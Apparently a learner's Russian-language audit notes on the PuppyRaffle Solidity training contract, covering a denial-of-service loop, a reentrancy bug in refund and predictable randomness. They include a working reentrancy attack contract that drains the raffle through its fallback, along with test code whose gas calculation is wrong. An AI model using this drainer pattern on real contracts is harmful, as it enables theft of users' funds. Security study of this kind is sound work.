function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }

        // Check for duplicates
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
        emit RaffleEnter(newPlayers);
    }


    в этой функции присутствует работа с циклами и так совпало что код идеально подходит под DOS
    если кратко добавление последующих людей в этот список будет стоит дороже из за постояной работы цикла пример теста 


     function testDosAttack() public {
        vm.fee(1);
        uint256 playersNum =100;
        address[] memory player =new address[](playersNum); 
        for(uint256 i; i <playersNum ;i++){
            player[i] =address(i);
        }
    uint256 gasStart=gasleft();
    puppyRaffle.enterRaffle{value :entranceFee *player.length}(player);
    uint256 gasEnd =gasleft();

    uint256 userUseGas = gasStart-gasEnd* tx.gasprice;
    console.log("100 user used Gas:" ,userUseGas);


    address[] memory playerTw =new address[](playersNum); 
        for(uint256 i; i <playersNum ;i++){
            playerTw[i] =address(i+playersNum);
        }
    uint256 gasStartTwo=gasleft();
    puppyRaffle.enterRaffle{value :entranceFee *playerTw.length}(playerTw);
    uint256 gasEndTwo =gasleft();

    uint256 userUseGasTwo = gasStartTwo-gasEndTwo*tx.gasprice;
    console.log("100+100 user used Gas:" ,userUseGasTwo);




     примерно вот такие выводы по итогу теста выше 
        ├─ [0] console::log("100 user used Gas:", 1073702786 [1.073e9]) [staticcall]
        ├─ [0] console::log("100+100 user used Gas:", 1067181247 [1.067e9]) [staticcall]



            ├─ [0] console::log("500 user used Gas:", 957720231 [9.577e8]) [staticcall]
                ├─ [0] console::log("500 user used Gas:", 1073644309 [1.073e9]) [staticcall]





                C помощью вот этого кода мы выявили ошибку reentrancy возможность эксплуотации находилось в функции рефанд 

                function testReentrancyGetRefund() public  {
         address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
            ReentrancyAttack attackContract = new ReentrancyAttack(puppyRaffle);
            address attacker = makeAddr("attacker");
            vm.deal(attacker,1 ether);

            uint256 startBalanceAttacker = address(attacker).balance;
            uint256 startContractBalance = address(puppyRaffle).balance;

            vm.prank(attacker);
            attackContract.attack{value :entranceFee}();
            console.log("Attacker balance after attack:", address(attacker).balance);
            console.log("Contract balance after attack:", address(puppyRaffle).balance);

            console.log("attacker ending balance:", address(attacker).balance);
            console.log("contract ending balance:", address(puppyRaffle).balance);
           }
}

contract ReentrancyAttack {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 atakerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
      address[] memory players= new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        atakerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(atakerIndex);

    }
    function stealMoney() public {
        if (address(puppyRaffle).balance >= entranceFee) {
                puppyRaffle.refund(atakerIndex);
                console.log("attacker steal money, current contract balance:", address(puppyRaffle).balance);
            }
    }
        fallback() external payable {
            stealMoney();
    }

    receive() external payable {
                    stealMoney();
    }
}






непосредственна вот код в котором содержалась данная ошибка 

 function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

в данной функции имеется дыра рандома ее легко предугодать злоумышленик может атаковать точнее перехватит нужную цифру 
к примеру допустим хакер перехватил цифры для победителя который определил контракт и юзанул эго тем самым перехватив нужную комбинацию 
тем самым он и тот кто выиграл имеют одинаковые данные для того чтобы забрать выигрыш к примеру с нфт либо же он может увидет что такой то редкий нфт выпадает 
он может раз за разом запускать контракт пока нужная редка нфт не выйдет в список минта потом контракт сам перехватит забрав дорогой нфт и игнорив обычные 
uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;